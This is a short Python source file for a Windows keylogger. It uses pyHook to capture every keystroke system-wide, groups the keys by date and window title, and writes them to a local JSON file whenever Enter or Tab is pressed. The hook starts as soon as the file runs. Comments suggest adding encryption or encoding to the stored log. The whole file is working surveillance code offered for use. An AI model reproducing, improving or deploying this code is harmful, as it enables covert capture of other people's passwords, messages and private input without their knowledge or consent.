import json
from datetime import date

import pyHook
import pythoncom


class Logger:
    """
    A basic implementation of a python key logger
    stores logged keys per-window per-date in a json format

    full log is stored in mem on a return key or tab key
    the buffer is written to disk.

    buffer structure - {date: {windows name: [list of keystrokes]}}
    """
    LOG_FILE: str = "LOG.json"  # log file path

    def __init__(self):
        self.hook = hook = pyHook.HookManager()
        hook.KeyDown = self.__write_event

        try:
            self.buffer = self.__load_buffer()
            self.buffer[str(date.today())] = dict()  # create new log dict for current date
        except (FileNotFoundError, json.decoder.JSONDecodeError):
            self.buffer = {str(date.today()): dict()}

    def __write_event(self, event: pyHook.KeyboardEvent):
        """
        keyboard press callback, process each key press as necessary.
        if tab or return are in the event the buffer is written out
        """
        print(event.WindowName, event.Key)  # debug

        if str(date.today()) not in self.buffer:  # check if current date in dict
            self.buffer[str(date.today())] = dict()
        if event.WindowName not in self.buffer[str(date.today())]:  # check if window already in dict
            self.buffer[str(date.today())][event.WindowName] = list()

        self.buffer[str(date.today())][event.WindowName].append(event.Key)  # add event to buffer

        if event.Ascii == 13 or event.Ascii == 9:  # when enter or tab is pressed the buffer is dumped
            self.__dump_buffer()

        return True  # required by hook manager

    def __load_buffer(self) -> dict:
        """
        Reads and loads the json buffer from disk
        other wise will be over written on next write

        Custom loading functionality can be added here
        e.g encryption, encoding, etc.

        :return: buffer
        """
        return json.loads(open(self.LOG_FILE, "r").read())

    def __dump_buffer(self):
        """
        Dumps json to log file
        if file doesnt exist it is created

        Custom dumping functionality can be added here
        e.g encryption, encoding, etc.
        """
        open(self.LOG_FILE, "w").write(json.dumps(self.buffer))

    def activate_hook(self):
        """
        Starts the hook event loop
        """
        self.hook.HookKeyboard()
        pythoncom.PumpMessages()


Logger().activate_hook()
